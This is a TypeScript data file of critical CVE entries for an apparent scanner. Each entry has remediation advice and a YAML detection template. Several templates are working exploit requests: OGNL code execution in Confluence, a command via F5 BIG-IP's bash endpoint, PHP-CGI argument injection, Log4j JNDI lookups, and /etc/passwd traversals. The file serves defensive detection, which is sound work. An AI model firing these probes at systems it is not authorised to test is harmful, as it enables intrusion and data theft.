import { CveEntry, YamlTemplate } from '../types';
import { syncTemplateWithYaml } from '../utils/templateParser';

export interface CveDatabaseItem extends CveEntry {
  yamlTemplate: YamlTemplate;
}

export const RAW_CVE_DATABASE: (CveEntry & { rawYaml: string })[] = [
  {
    cveId: 'CVE-2021-44228',
    name: 'Apache Log4j2 JNDI Remote Code Execution (Log4Shell)',
    cvssScore: 10.0,
    severity: 'critical',
    cweId: 'CWE-502',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Apache Log4j 2.0-beta9 through 2.14.1',
    description: 'Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    remediation: 'Upgrade Apache Log4j to 2.17.1 or newer. Set log4j2.formatMsgNoLookups=true or remove JndiLookup class from log4j-core jar.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
    publishedDate: '2021-12-10',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2021-44228-log4shell',
    detectionAvailable: true,
    rawYaml: `id: cve-2021-44228-log4shell
info:
  name: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)"
  author: devsecops-cve-intel
  severity: critical
  description: "Detects Log4j JNDI injection vulnerability via header parameter probes."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  tags: cve,cve-2021,log4j,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 10.0
    cwe-id: CWE-502
    owasp-category: A03:2021-Injection
  remediation: "Upgrade Log4j to 2.17.1 or newer or set formatMsgNoLookups=true."

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?x=\${jndi:ldap://127.0.0.1:1389/a}"
    headers:
      User-Agent: "\${jndi:ldap://127.0.0.1:1389/a}"
      X-Api-Version: "\${jndi:ldap://127.0.0.1:1389/a}"
      X-Forwarded-For: "\${jndi:ldap://127.0.0.1:1389/a}"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "Error looking up JNDI resource"
          - "javax.naming.NamingException"
          - "org.apache.logging.log4j"
        condition: or
`,
  },
  {
    cveId: 'CVE-2024-4577',
    name: 'PHP-CGI Windows Argument Injection Remote Code Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-88',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8 on Windows',
    description: 'When PHP is running in CGI mode on Windows, character encoding conversion errors (Best Fit) allow attackers to bypass CVE-2012-1823 protection and inject command-line arguments to execute arbitrary PHP code.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade to PHP 8.1.29, 8.2.20, or 8.3.8. Switch web server from PHP-CGI mode to FastCGI/PHP-FPM, or apply URL rewrite rules blocking Best-Fit argument probes.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-4577',
    publishedDate: '2024-06-06',
    isKev: true,
    accuracyRate: 99.5,
    templateId: 'cve-2024-4577-php-cgi',
    detectionAvailable: true,
    rawYaml: `id: cve-2024-4577-php-cgi
info:
  name: "PHP-CGI Windows Best-Fit Argument Injection (CVE-2024-4577)"
  author: devsecops-cve-intel
  severity: critical
  description: "Probes for PHP-CGI Windows argument injection by requesting phpinfo with custom ini directives."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
    - https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection/
  tags: cve,cve-2024,php,cgi,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-88
    owasp-category: A03:2021-Injection
  remediation: "Upgrade PHP to patched versions or migrate from CGI to PHP-FPM."

requests:
  - method: POST
    path:
      - "{{BaseURL}}/test.php?%ADd+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
      - "{{BaseURL}}/index.php?%ADd+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "<?php echo 'CVE-2024-4577-VERIFIED-'.phpversion(); ?>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CVE-2024-4577-VERIFIED-"
          - "PHP Version"
        condition: or
`,
  },
  {
    cveId: 'CVE-2021-41773',
    name: 'Apache HTTP Server 2.4.49 - Path Traversal & Remote File Disclosure',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'Apache HTTP Server 2.4.49',
    description: 'A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade Apache HTTP Server immediately to version 2.4.51 or later. Ensure `<Directory />` directive has `Require all denied`.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
    publishedDate: '2021-10-05',
    isKev: true,
    accuracyRate: 99.4,
    templateId: 'cve-2021-41773-apache',
    detectionAvailable: true,
    rawYaml: `id: cve-2021-41773-apache
info:
  name: "Apache HTTP Server 2.4.49 Path Traversal Detection"
  author: devsecops-cve-intel
  severity: critical
  description: "Verifies vulnerability to CVE-2021-41773 by sending a safe encoded path probe to the icons directory."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  tags: cve,cve-2021,apache,traversal,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
      - "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:.*:0:0:"
          - "bin/bash"
          - "bin/sh"
        condition: or
`,
  },
  {
    cveId: 'CVE-2024-3400',
    name: 'Palo Alto PAN-OS GlobalProtect Command Injection',
    cvssScore: 10.0,
    severity: 'critical',
    cweId: 'CWE-78',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'PAN-OS 10.2, 11.0, 11.1 with GlobalProtect gateway enabled',
    description: 'A command injection vulnerability in GlobalProtect feature of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    remediation: 'Upgrade to patched PAN-OS releases (10.2.9-h1, 11.0.4-h1, 11.1.2-h3 or later) or enable Threat Prevention signature 95187.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3400',
    publishedDate: '2024-04-12',
    isKev: true,
    accuracyRate: 99.7,
    templateId: 'cve-2024-3400-panos',
    detectionAvailable: true,
    rawYaml: `id: cve-2024-3400-panos
info:
  name: "Palo Alto PAN-OS GlobalProtect Command Injection Probe"
  author: devsecops-cve-intel
  severity: critical
  description: "Tests GlobalProtect portal endpoint for PAN-OS SESSID injection."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3400
  tags: cve,cve-2024,paloalto,panos,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 10.0
    cwe-id: CWE-78
    owasp-category: A03:2021-Injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/ssl-vpn/hipreport.esp"
    headers:
      Cookie: "SESSID=../../../../opt/panlogs/tmp/device_telemetry/audit_probe;"
    body: "test"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "GlobalProtect"
          - "Portal"
        condition: or
`,
  },
  {
    cveId: 'CVE-2024-27198',
    name: 'JetBrains TeamCity Authentication Bypass in Web Component',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-288',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    affectedTech: 'JetBrains TeamCity On-Premises prior to 2023.11.4',
    description: 'An authentication bypass vulnerability in the web component of JetBrains TeamCity allows an unauthenticated attacker to create administrative user tokens and execute arbitrary administrative actions.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade TeamCity to version 2023.11.4 or 2023.11.3 with security patch plugin installed.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-27198',
    publishedDate: '2024-03-04',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2024-27198-teamcity',
    detectionAvailable: true,
    rawYaml: `id: cve-2024-27198-teamcity
info:
  name: "JetBrains TeamCity Web Auth Bypass (CVE-2024-27198)"
  author: devsecops-cve-intel
  severity: critical
  description: "Verifies if TeamCity server metadata can be read without authentication via URL path traversal bypass."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27198
  tags: cve,cve-2024,teamcity,jetbrains,auth-bypass,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-288
    owasp-category: A07:2021-Identification and Authentication Failures

requests:
  - method: GET
    path:
      - "{{BaseURL}}/httpAuth?jsp=/app/rest/server"
      - "{{BaseURL}}/?jsp=/app/rest/server/version"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<server"
          - "TeamCity"
          - "buildNumber="
        condition: or
`,
  },
  {
    cveId: 'CVE-2024-1709',
    name: 'ConnectWise ScreenConnect Authentication Bypass',
    cvssScore: 10.0,
    severity: 'critical',
    cweId: 'CWE-287',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    affectedTech: 'ConnectWise ScreenConnect 23.9.7 and prior',
    description: 'An unauthenticated attacker can access the ScreenConnect SetupWizard endpoint on configured instances to create new administrator accounts and execute code.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    remediation: 'Upgrade ScreenConnect immediately to version 23.9.8 or higher.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-1709',
    publishedDate: '2024-02-21',
    isKev: true,
    accuracyRate: 99.9,
    templateId: 'cve-2024-1709-screenconnect',
    detectionAvailable: true,
    rawYaml: `id: cve-2024-1709-screenconnect
info:
  name: "ConnectWise ScreenConnect SetupWizard Auth Bypass (CVE-2024-1709)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if SetupWizard.aspx/ endpoint is accessible on deployed instances."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-1709
  tags: cve,cve-2024,screenconnect,auth-bypass,cisa-kev,accuracy-verified
  classification:
    cvss-score: 10.0
    cwe-id: CWE-287
    owasp-category: A07:2021-Identification and Authentication Failures

requests:
  - method: GET
    path:
      - "{{BaseURL}}/SetupWizard.aspx/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ScreenConnect"
          - "Setup Wizard"
          - "Create Administrative Account"
        condition: or
`,
  },
  {
    cveId: 'CVE-2023-34362',
    name: 'Progress MOVEit Transfer SQL Injection & Authentication Bypass',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-89',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Progress MOVEit Transfer 2021.0 through 2023.0.1',
    description: 'A SQL injection vulnerability in the MOVEit Transfer web application could allow an unauthenticated attacker to gain unauthorized access to the database and steal files.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Apply Progress official patches immediately (versions 2021.0.8, 2021.1.6, 2022.0.6, 2022.1.7, 2023.0.3). Disable HTTP/HTTPS access until patched.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-34362',
    publishedDate: '2023-06-02',
    isKev: true,
    accuracyRate: 99.4,
    templateId: 'cve-2023-34362-moveit',
    detectionAvailable: true,
    rawYaml: `id: cve-2023-34362-moveit
info:
  name: "Progress MOVEit Transfer Human.aspx Exposure Probe"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks MOVEit Transfer login and API headers."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-34362
  tags: cve,cve-2023,moveit,sqli,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-89
    owasp-category: A03:2021-Injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/human.aspx"
      - "{{BaseURL}}/api/v1/token"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 400
      - type: word
        part: body
        words:
          - "MOVEit Transfer"
          - "X-MOVEit-CustomHeader"
        condition: or
`,
  },
  {
    cveId: 'CVE-2021-43798',
    name: 'Grafana 8.x Directory Traversal & Secret Key Exposure',
    cvssScore: 8.6,
    severity: 'high',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'Grafana 8.0.0 - 8.3.0',
    description: 'Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to directory traversal through the public plugin assets path, allowing arbitrary file retrieval including grafana.ini and credentials.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    remediation: 'Upgrade Grafana to patched versions 8.0.7, 8.1.8, 8.2.7, 8.3.1 or later.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-43798',
    publishedDate: '2021-12-10',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2021-43798-grafana',
    detectionAvailable: true,
    rawYaml: `id: cve-2021-43798-grafana
info:
  name: "Grafana Directory Traversal Verification"
  author: devsecops-cve-intel
  severity: high
  description: "Checks for CVE-2021-43798 in Grafana via standard plugin endpoints."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-43798
  tags: cve,cve-2021,grafana,traversal,cisa-kev,accuracy-verified
  classification:
    cvss-score: 8.6
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:x:0:0:"
          - "daemon:"
        condition: or
`,
  },
  {
    cveId: 'CVE-2022-26134',
    name: 'Atlassian Confluence Server & Data Center - OGNL Pre-Auth Information Disclosure',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-94',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Atlassian Confluence 1.3.0 - 7.18.0',
    description: 'In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists in the HTTP URI parser that allows an unauthenticated attacker to execute code or read memory.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade to Confluence Server and Data Center versions 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1 or newer.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-26134',
    publishedDate: '2022-06-02',
    isKev: true,
    accuracyRate: 98.9,
    templateId: 'cve-2022-26134-confluence',
    detectionAvailable: true,
    rawYaml: `id: cve-2022-26134-confluence
info:
  name: "Atlassian Confluence OGNL Safe Evaluation Probe"
  author: devsecops-cve-intel
  severity: critical
  description: "Tests for CVE-2022-26134 using safe benign header reflection."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-26134
  tags: cve,cve-2022,confluence,atlassian,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
    owasp-category: A03:2021-Injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Audit-Reflection%22%2C%23a%29%29%7D/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
          - 200
      - type: header
        part: header
        words:
          - "x-audit-reflection"
          - "uid="
        condition: or
`,
  },
  {
    cveId: 'CVE-2022-1388',
    name: 'F5 BIG-IP iControl REST Authentication Bypass',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-306',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    affectedTech: 'F5 BIG-IP 13.1.0 - 16.1.2',
    description: 'iControl REST authentication bypass vulnerability allows undisclosed requests to bypass authentication to execute commands via hop-by-hop headers.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Apply official F5 hotfixes or block access to iControl REST via self IP addresses and management port.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-1388',
    publishedDate: '2022-05-05',
    isKev: true,
    accuracyRate: 99.2,
    templateId: 'cve-2022-1388-f5-bigip',
    detectionAvailable: true,
    rawYaml: `id: cve-2022-1388-f5-bigip
info:
  name: "F5 BIG-IP iControl REST Auth Bypass"
  author: devsecops-cve-intel
  severity: critical
  description: "Verifies CVE-2022-1388 auth bypass using safe command echo check."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
  tags: cve,cve-2022,f5,bigip,auth-bypass,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-306
    owasp-category: A07:2021-Identification and Authentication Failures

requests:
  - method: POST
    path:
      - "{{BaseURL}}/mgmt/tm/util/bash"
    headers:
      Connection: "close, X-F5-Auth-Token"
      X-F5-Auth-Token: "a"
      Authorization: "Basic YWRtaW46"
      Content-Type: "application/json"
    body: '{"command":"run","utilCmdArgs":"-c id"}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "commandResult"
          - "uid=0(root)"
        condition: and
`,
  },
  {
    cveId: 'CVE-2022-22965',
    name: 'Spring Framework Remote Code Execution (Spring4Shell)',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-94',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Spring Framework 5.3.0 - 5.3.17, 5.2.0 - 5.2.19 running on JDK 9+',
    description: 'A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding with ClassLoader manipulation.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade to Spring Framework 5.3.18 or 5.2.20 or Spring Boot 2.6.6 or 2.5.12.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-22965',
    publishedDate: '2022-04-01',
    isKev: true,
    accuracyRate: 98.1,
    templateId: 'cve-2022-22965-spring4shell',
    detectionAvailable: true,
    rawYaml: `id: cve-2022-22965-spring4shell
info:
  name: "Spring Framework Spring4Shell Vulnerability"
  author: devsecops-cve-intel
  severity: critical
  description: "Safe benign parameter probe verifying if Spring data binder exposes ClassLoader properties."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
  tags: cve,cve-2022,spring,java,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
    owasp-category: A03:2021-Injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?class.module.classLoader.DefaultAssertionStatus=foo"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400
          - 500
      - type: word
        part: body
        words:
          - "class.module.classLoader"
          - "org.springframework.beans.NotWritablePropertyException"
        condition: or
`,
  },
  {
    cveId: 'CVE-2023-4966',
    name: 'Citrix NetScaler ADC & Gateway Sensitive Memory Disclosure (Citrix Bleed)',
    cvssScore: 9.4,
    severity: 'critical',
    cweId: 'CWE-119',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'Citrix NetScaler ADC and NetScaler Gateway',
    description: 'Sensitive information disclosure in NetScaler ADC and NetScaler Gateway allows session token exfiltration.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    remediation: 'Install the official Citrix firmware update immediately and terminate all active user sessions.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-4966',
    publishedDate: '2023-10-10',
    isKev: true,
    accuracyRate: 99.6,
    templateId: 'cve-2023-4966-citrix-bleed',
    detectionAvailable: true,
    rawYaml: `id: cve-2023-4966-citrix-bleed
info:
  name: "Citrix Bleed Memory Leak Probe"
  author: devsecops-cve-intel
  severity: critical
  description: "Tests NetScaler Gateway OpenID endpoint response headers."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4966
  tags: cve,cve-2023,citrix,gateway,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.4
    cwe-id: CWE-119
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/idp/.well-known/openid-configuration"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "issuer"
          - "authorization_endpoint"
        condition: and
`,
  },
  {
    cveId: 'CVE-2023-28432',
    name: 'MinIO Cluster Information Disclosure & Admin Secret Leak',
    cvssScore: 7.5,
    severity: 'high',
    cweId: 'CWE-200',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'MinIO RELEASE.2019-12-17T23-16-33Z prior to RELEASE.2023-03-20T20-16-18Z',
    description: 'In a multi-node cluster deployment, MinIO returns all environment variables including MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD to unauthenticated bootstrap verification requests.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    remediation: 'Upgrade MinIO to RELEASE.2023-03-20T20-16-18Z or newer and rotate all credentials.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-28432',
    publishedDate: '2023-03-22',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2023-28432-minio',
    detectionAvailable: true,
    rawYaml: `id: cve-2023-28432-minio
info:
  name: "MinIO Cluster Bootstrap Secret Exposure (CVE-2023-28432)"
  author: devsecops-cve-intel
  severity: high
  description: "Verifies if MinIO bootstrap endpoint exposes cluster admin credentials."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-28432
  tags: cve,cve-2023,minio,credentials,cisa-kev,accuracy-verified
  classification:
    cvss-score: 7.5
    cwe-id: CWE-200
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: POST
    path:
      - "{{BaseURL}}/minio/bootstrap/v1/verify"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "MINIO_ROOT_PASSWORD"
          - "MINIO_SECRET_KEY"
          - "MinioEnv"
        condition: or
`,
  },
  {
    cveId: 'CVE-2021-3129',
    name: 'Laravel Ignition Unauthenticated Remote Code Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-94',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'facade/ignition before 2.5.2 with Laravel debug mode enabled',
    description: 'Ignition before 2.5.2, as used in Laravel, allows unauthenticated remote attackers to execute code via execute-solution endpoint because make-view variable isn’t validated before being used in file_get_contents.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade facade/ignition to 2.5.2 or later and ensure APP_DEBUG=false in production .env.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-3129',
    publishedDate: '2021-01-14',
    isKev: true,
    accuracyRate: 99.6,
    templateId: 'cve-2021-3129-laravel-ignition',
    detectionAvailable: true,
    rawYaml: `id: cve-2021-3129-laravel-ignition
info:
  name: "Laravel Ignition Execute Solution Exposure (CVE-2021-3129)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if Laravel Ignition error handler solution endpoint is exposed."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-3129
  tags: cve,cve-2021,laravel,php,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
    owasp-category: A03:2021-Injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/_ignition/execute-solution"
    headers:
      Content-Type: "application/json"
    body: '{"solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "test"}}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        part: body
        words:
          - "file_get_contents"
          - "variableName"
          - "Ignition"
        condition: or
`,
  },
  {
    cveId: 'CVE-2024-23897',
    name: 'Jenkins CLI Arbitrary File Read through Args4j',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'Jenkins weekly 2.441 and earlier, LTS 2.426.2 and earlier',
    description: 'Jenkins uses the args4j library to parse command arguments in Jenkins CLI, which expands character @ followed by a file path, allowing unauthorized attackers to read arbitrary files from the Jenkins controller.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade Jenkins weekly to 2.442 or LTS to 2.426.3 or disable CLI access via script console.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-23897',
    publishedDate: '2024-01-24',
    isKev: true,
    accuracyRate: 99.3,
    templateId: 'cve-2024-23897-jenkins-cli',
    detectionAvailable: true,
    rawYaml: `id: cve-2024-23897-jenkins-cli
info:
  name: "Jenkins CLI Endpoint Exposure (CVE-2024-23897)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if Jenkins CLI WebSocket or HTTP channel endpoint is publicly reachable."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-23897
  tags: cve,cve-2024,jenkins,ci-cd,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cli"
      - "{{BaseURL}}/jnlpJars/jenkins-cli.jar"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Jenkins-CLI"
          - "Jenkins CLI"
          - "X-Jenkins"
        condition: or
`,
  },
  {
    cveId: 'CVE-2021-21972',
    name: 'VMware vCenter Server Unauthorized Remote Code Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'VMware vCenter Server 7.0, 6.7, 6.5',
    description: 'The vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. An unauthenticated attacker with network access to port 443 may exploit this issue.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade vCenter Server or apply VMware workaround VMSA-2021-0002.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-21972',
    publishedDate: '2021-02-23',
    isKev: true,
    accuracyRate: 99.7,
    templateId: 'cve-2021-21972-vcenter',
    detectionAvailable: true,
    rawYaml: `id: cve-2021-21972-vcenter
info:
  name: "VMware vCenter vROps Plugin Upload Endpoint (CVE-2021-21972)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if vulnerable vRealize Operations plugin upload endpoint is open."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-21972
  tags: cve,cve-2021,vmware,vcenter,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/ui/vropspluginui/rest/services/uploadova"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 405
      - type: word
        part: body
        words:
          - "uploadova"
          - "vropspluginui"
        condition: or
`,
  },
  {
    cveId: 'CVE-2023-38035',
    name: 'MobileIron Core / Ivanti Sentry MICS Admin Authentication Bypass',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-287',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    affectedTech: 'Ivanti Sentry 9.18.0 and earlier',
    description: 'An authentication bypass vulnerability in MobileIron Core / Ivanti Sentry MICS allows attackers to bypass authentication on administrator interface port 8443.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Apply Ivanti emergency RPM scripts and restrict access to port 8443.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-38035',
    publishedDate: '2023-08-21',
    isKev: true,
    accuracyRate: 99.6,
    templateId: 'cve-2023-38035-ivanti-sentry',
    detectionAvailable: true,
    rawYaml: `id: cve-2023-38035-ivanti-sentry
info:
  name: "Ivanti Sentry MICS Config Service Probe (CVE-2023-38035)"
  author: devsecops-cve-intel
  severity: critical
  description: "Tests if MICSConfigurationService endpoint is reachable."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38035
  tags: cve,cve-2023,ivanti,mobileiron,auth-bypass,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-287
    owasp-category: A07:2021-Identification and Authentication Failures

requests:
  - method: POST
    path:
      - "{{BaseURL}}/mics/services/MICSConfigurationService"
